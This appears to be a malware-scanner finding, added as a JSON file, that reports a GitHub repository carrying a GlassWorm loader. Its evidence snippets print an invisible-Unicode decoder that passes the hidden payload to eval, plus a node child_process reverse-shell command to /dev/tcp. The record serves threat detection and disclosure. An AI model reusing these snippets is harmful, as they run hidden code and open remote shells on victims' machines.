@@ -1,0 +1,123 @@
+{
+  "finding": {
+    "key": "repository:nxvh1337/pua-encoder",
+    "kind": "repository",
+    "family": "",
+    "id": "nxvh1337/pua-encoder",
+    "url": "https://github.com/Nxvh1337/PUA-encoder",
+    "registry": "github",
+    "owner": "nxvh1337",
+    "status": "confirmed",
+    "confidence": "auto",
+    "score": 10,
+    "detection_method": "signature_match",
+    "attribution": "",
+    "campaign_id": "",
+    "rules": "malware_signature/invisible-unicode-payload; malware_signature/glassworm-ioc; code_execution/node-child-process; code_execution/js-exec",
+    "evidence_locations": "randomrepo.js:12; malicious.js:1; encoder.js:1",
+    "c2_hosts": "",
+    "iocs": "randomrepo.js",
+    "matched_signatures": "codePointAt 0xFE00 0xE0100 eval; codePointAt 0xFE00 0xE0100 Function",
+    "reasons": "Shares a confirmed-malware code signature ['codePointAt 0xFE00 0xE0100 eval', 'codePointAt 0xFE00 0xE0100 Function'] | Tier-2 confirmed (bash score 8)",
+    "osm_status": "submitted",
+    "osm_threat_id": "af2bbe85-a671-48d3-bc87-6aa4bbd9e909",
+    "first_seen": "hunt-20261011T214533Z",
+    "last_seen": "hunt-20261011T214533Z",
+    "evidence_file": "repositories/nxvh1337_pua-encoder.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": "randomrepo.js",
+      "line": 12,
+      "category": "malware_signature",
+      "rule": "invisible-unicode-payload",
+      "snippet": "const d = s => [...s].map(c => (c = c.codePointAt(0), c >= 0xFE00 && c <= 0xFE0F ? c - 0xFE00 : c >= 0xE0100 && c <= 0xE01EF ? c - 0xE0100 + 16 : null)).filter(b => b !== null); eval(Buffer.from(d(`󠄘󠄘"
+    },
+    {
+      "file": "randomrepo.js",
+      "line": 12,
+      "category": "malware_signature",
+      "rule": "glassworm-ioc",
+      "snippet": "const d = s => [...s].map(c => (c = c.codePointAt(0), c >= 0xFE00 && c <= 0xFE0F ? c - 0xFE00 : c >= 0xE0100 && c <= 0xE01EF ? c - 0xE0100 + 16 : null)).filter(b => b !== null); eval(Buffer.from(d(`󠄘󠄘"
+    },
+    {
+      "file": "malicious.js",
+      "line": 1,
+      "category": "malware_signature",
+      "rule": "invisible-unicode-payload",
+      "snippet": "const d = s => [...s].map(c => (c = c.codePointAt(0), c >= 0xFE00 && c <= 0xFE0F ? c - 0xFE00 : c >= 0xE0100 && c <= 0xE01EF ? c - 0xE0100 + 16 : null)).filter(b => b !== null); eval(Buffer.from(d(`󠅢󠅕"
+    },
+    {
+      "file": "malicious.js",
+      "line": 1,
+      "category": "malware_signature",
+      "rule": "glassworm-ioc",
+      "snippet": "const d = s => [...s].map(c => (c = c.codePointAt(0), c >= 0xFE00 && c <= 0xFE0F ? c - 0xFE00 : c >= 0xE0100 && c <= 0xE01EF ? c - 0xE0100 + 16 : null)).filter(b => b !== null); eval(Buffer.from(d(`󠅢󠅕"
+    },
+    {
+      "file": "randomrepo.js",
+      "line": 12,
+      "category": "malware_signature",
+      "rule": "invisible-unicode-payload",
+      "snippet": "const d = s => [...s].map(c => (c = c.codePointAt(0), c >= 0xFE00 && c <= 0xFE0F ? c - 0xFE00 : c >= 0xE0100 && c <= 0xE01EF ? c - 0xE0100 + 16 : null)).filter(b => b !== null); eval(Buffer.from(d(`󠄘󠄘"
+    },
+    {
+      "file": "randomrepo.js",
+      "line": 12,
+      "category": "malware_signature",
+      "rule": "glassworm-ioc",
+      "snippet": "const d = s => [...s].map(c => (c = c.codePointAt(0), c >= 0xFE00 && c <= 0xFE0F ? c - 0xFE00 : c >= 0xE0100 && c <= 0xE01EF ? c - 0xE0100 + 16 : null)).filter(b => b !== null); eval(Buffer.from(d(`󠄘󠄘"
+    },
+    {
+      "file": "malicious.js",
+      "line": 1,
+      "category": "malware_signature",
+      "rule": "invisible-unicode-payload",
+      "snippet": "const d = s => [...s].map(c => (c = c.codePointAt(0), c >= 0xFE00 && c <= 0xFE0F ? c - 0xFE00 : c >= 0xE0100 && c <= 0xE01EF ? c - 0xE0100 + 16 : null)).filter(b => b !== null); eval(Buffer.from(d(`󠅢󠅕"
+    },
+    {
+      "file": "malicious.js",
+      "line": 1,
+      "category": "malware_signature",
+      "rule": "glassworm-ioc",
+      "snippet": "const d = s => [...s].map(c => (c = c.codePointAt(0), c >= 0xFE00 && c <= 0xFE0F ? c - 0xFE00 : c >= 0xE0100 && c <= 0xE01EF ? c - 0xE0100 + 16 : null)).filter(b => b !== null); eval(Buffer.from(d(`󠅢󠅕"
+    },
+    {
+      "file": "encoder.js",
+      "line": 1,
+      "category": "code_execution",
+      "rule": "node-child-process",
+      "snippet": "const payload = `(()=>{const{spawn}=require('child_process');const p=spawn('bash',['-c','bash -i >& /dev/tcp/127.0.0.1/9001 0>&1'],{detached:true,stdio:'ignore'});p.unref()})()`;"
+    },
+    {
+      "file": "encoder.js",
+      "line": 1,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "const payload = `(()=>{const{spawn}=require('child_process');const p=spawn('bash',['-c','bash -i >& /dev/tcp/127.0.0.1/9001 0>&1'],{detached:true,stdio:'ignore'});p.unref()})()`;"
+    }
+  ],
+  "commit_sha": "1b49311e56c20d60c36983af9227f1849a7eb1f1",
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/nxvh1337/pua-encoder",
+    "version_info": "all",
+    "threat_description": "GlassWorm loader (invisible Unicode payload, Solana dead-drop C2). Payload in randomrepo.js, malicious.js.\nOutbound: documented for this malware family (randomrepo.js:12).\nThe same dropper is planted in 2 directories.\nFound by GitHub code search for a confirmed malware signature: codePointAt 0xFE00 0xE0100 eval; codePointAt 0xFE00 0xE0100 Function.\nConfirmed by static analysis; the code was read, never executed.",
+    "payload_description": "Malicious payload found in: randomrepo.js, malicious.js\n- Outbound: documented for this malware family (randomrepo.js:12).\n- randomrepo.js:12: long run of invisible Unicode variation selectors: an encoded payload that renders as an empty string (+1 more)\n- randomrepo.js:12: GlassWorm/ForceMemo fingerprint (variation-selector decoder, Solana dead-drop wallet, ForceMemo marker or C2 address) (+1 more)",
+    "publisher": "nxvh1337",
+    "severity_level": "critical",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "glassworm",
+      "malware"
+    ],
+    "evidence_references": "https://github.com/nxvh1337/pua-encoder/blob/1b49311e56c20d60c36983af9227f1849a7eb1f1/randomrepo.js#L12\nhttps://github.com/nxvh1337/pua-encoder/blob/1b49311e56c20d60c36983af9227f1849a7eb1f1/malicious.js#L1\nhttps://github.com/nxvh1337/pua-encoder/blob/1b49311e56c20d60c36983af9227f1849a7eb1f1/encoder.js#L1",
+    "verified_iocs": "randomrepo.js",
+    "contributors": [],
+    "first_seen": "2026-10-11T21:45:33Z",
+    "last_seen": "2026-10-11T21:45:33Z"
+  }
+}
